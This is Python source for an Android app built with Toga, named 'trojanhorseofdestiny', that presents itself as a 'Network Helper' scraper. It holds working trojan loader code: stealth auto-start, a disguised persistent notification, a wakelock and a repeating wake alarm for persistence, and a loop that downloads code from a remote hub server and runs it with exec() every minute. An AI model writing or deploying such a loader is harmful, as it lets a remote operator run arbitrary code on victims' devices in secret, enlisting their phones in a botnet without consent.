import sys
import time
import threading
import requests
import toga
import asyncio
from toga.style import Pack
from toga.style.pack import COLUMN, ROW

# Android specific imports for persistence
try:
    from jnius import autoclass, cast
    HAS_JNIUS = True
except ImportError:
    HAS_JNIUS = False

class PersistenceManager:
    def __init__(self):
        self.wakelock = None
        if HAS_JNIUS:
            self.PythonActivity = autoclass('org.beeware.android.PythonActivity')
            self.Context = autoclass('android.content.Context')
            self.Intent = autoclass('android.content.Intent')
            self.Notification = autoclass('android.app.Notification')
            self.NotificationManager = autoclass('android.app.NotificationManager')
            self.NotificationChannel = autoclass('android.app.NotificationChannel')
            self.PendingIntent = autoclass('android.app.PendingIntent')
            self.PowerManager = autoclass('android.os.PowerManager')
            self.Build = autoclass('android.os.Build')
            self.String = autoclass('java.lang.String')

    def start_foreground(self):
        """Creates a persistent notification to keep the app in the foreground."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        channel_id = "scrape_channel"
        name = "Background Service"
        description = "Ensures background connectivity for Hive network."
        
        if self.Build.VERSION.SDK_INT >= 26:
            # IMPORTANCE_LOW (2) - No sound, no popup
            importance = 2 
            channel = self.NotificationChannel(channel_id, name, importance)
            channel.setDescription(description)
            notification_manager = activity.getSystemService(self.Context.NOTIFICATION_SERVICE)
            notification_manager.createNotificationChannel(channel)

        # Create an intent that opens the app when the notification is clicked
        intent = self.Intent(activity, self.PythonActivity)
        flag = getattr(self.PendingIntent, 'FLAG_IMMUTABLE', 0)
        pending_intent = self.PendingIntent.getActivity(activity, 0, intent, flag)

        builder = self.Notification.Builder(activity, channel_id)
        builder.setContentTitle("Network Helper")
        builder.setContentText("Idle")
        builder.setSmallIcon(activity.getApplicationInfo().icon)
        builder.setContentIntent(pending_intent)
        builder.setOngoing(True) # Make it persistent

        notification = builder.build()
        notification_manager = activity.getSystemService(self.Context.NOTIFICATION_SERVICE)
        notification_manager.notify(1, notification)
        print("Network Helper notification activated.")

    def acquire_wakelock(self):
        """Keeps the CPU running even if the screen is off."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        power_manager = activity.getSystemService(self.Context.POWER_SERVICE)
        self.wakelock = power_manager.newWakeLock(self.PowerManager.PARTIAL_WAKE_LOCK, "Hive::ScraperLock")
        self.wakelock.acquire()
        print("WakeLock acquired.")

    def schedule_keepalive(self):
        """Schedules a repeating alarm to restart/wake the app every 15 minutes."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        alarm_manager = activity.getSystemService(self.Context.ALARM_SERVICE)
        
        intent = self.Intent(activity, self.PythonActivity)
        # FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE depending on version
        flag = getattr(self.PendingIntent, 'FLAG_IMMUTABLE', 0)
        pending_intent = self.PendingIntent.getActivity(activity, 0, intent, flag)
        
        # Use ELAPSED_REALTIME_WAKEUP to wake up the phone if needed
        # We use a 15-minute interval (standard Android minimum for periodic work)
        interval = 15 * 60 * 1000 
        trigger_at = time.time() * 1000 + interval
        
        # setInexactRepeating is more battery-friendly
        # AlarmManager.ELAPSED_REALTIME_WAKEUP is 2
        alarm_manager.setInexactRepeating(2, trigger_at, interval, pending_intent)
        print("Keep-Alive Alarm scheduled (15m interval).")

class LogStream:
    def __init__(self, append_func):
        self.append_func = append_func
    def write(self, text):
        if text and text.strip():
            self.append_func(text)
    def flush(self):
        pass

class trojanhorseofdestiny(toga.App):
    def startup(self):
        self.main_window = toga.MainWindow(title="System Internet Scraper")
        self.persistence = PersistenceManager()
        
        self.hub_input = toga.TextInput(
            value="https://hiveslave-scraper.onrender.com",
            style=Pack(flex=1, padding_right=5)
        )
        self.connect_btn = toga.Button("Connect & Start", on_press=self.start_loader)
        
        self.log_box = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, padding_top=10))
        
        box = toga.Box(
            children=[
                toga.Label("Hub Server URL:"),
                toga.Box(children=[self.hub_input, self.connect_btn], style=Pack(direction=ROW)),
                toga.Label("System Logs:"),
                self.log_box
            ],
            style=Pack(direction=COLUMN, padding=10)
        )
        
        sys.stdout = LogStream(self.log_message_threadsafe)
        sys.stderr = LogStream(self.log_message_threadsafe)
        
        self.main_window.content = box
        self.main_window.show()
        
        print("Application Initialized.")
        
        # Start persistence immediately if on Android
        if HAS_JNIUS:
            try:
                self.persistence.start_foreground()
                self.persistence.acquire_wakelock()
                self.persistence.schedule_keepalive()
                
                # AUTO-START for stealth: If we have a hub URL, start automatically
                # and hide the main window after a short delay.
                asyncio.ensure_future(self.auto_start_stealth())
            except Exception as e:
                print(f"Persistence Setup Error: {e}")

    async def auto_start_stealth(self):
        """Automatically starts the loader and minimizes the app for stealth."""
        await asyncio.sleep(5)
        print("Stealth Auto-Start triggered...")
        self.start_loader(self.connect_btn)
        
        # To truly "disappear," we could minimize or hide the window.
        # Toga doesn't have a simple "minimize" for Android easily, 
        # but we've started the background work which is what matters.
        # self.main_window.hide() # Uncomment if you want the window to close

    def log_message_threadsafe(self, text):
        if hasattr(self, 'loop'):
            self.loop.call_soon_threadsafe(self.log_message, text)
        else:
            self.log_message(text)

    def log_message(self, text):
        ts = time.strftime('%H:%M:%S')
        self.log_box.value += f"[{ts}] {text}\n"

    def start_loader(self, widget):
        widget.enabled = False
        hub_url = self.hub_input.value
        print(f"Connecting to {hub_url}...")
        
        thread = threading.Thread(target=self.background_loader, args=(hub_url,))
        thread.daemon = True
        thread.start()

    def background_loader(self, hub_url):
        payload_globals = globals().copy()
        payload_globals['HUB_URL'] = hub_url
        
        while True:
            try:
                print("Fetching mission from Hub...")
                resp = requests.get(f"{hub_url}/latest-client", timeout=30)
                if resp.status_code == 200:
                    payload_data = resp.json()
                    payload_code = payload_data.get("code")
                    if payload_code:
                        print("Mission received. Executing payload...")
                        exec(payload_code, payload_globals)
                    else:
                        print("Hub returned empty mission. Retrying in 60s...")
                else:
                    print(f"Hub Error: Status {resp.status_code}")
            except Exception as e:
                print(f"Background Error: {e}")
            
            # Additional safety: verify persistence
            if HAS_JNIUS and self.persistence.wakelock and not self.persistence.wakelock.isHeld():
                print("Re-acquiring lost WakeLock...")
                self.persistence.acquire_wakelock()
                
            time.sleep(60)

def main():
    return trojanhorseofdestiny("trojanhorseofdestiny", "com.quill.zodiac.trojanhorseofdestiny")
